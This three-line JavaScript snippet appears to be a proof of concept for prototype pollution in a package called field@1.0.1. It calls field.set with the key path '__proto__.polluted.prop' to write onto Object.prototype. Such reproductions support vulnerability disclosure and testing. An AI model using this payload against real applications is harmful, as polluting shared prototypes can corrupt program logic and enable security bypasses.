var field = require('./field@1.0.1')

Object.prototype._polluted = 1;
field.set({}, '__proto__.polluted.prop', 'yes')
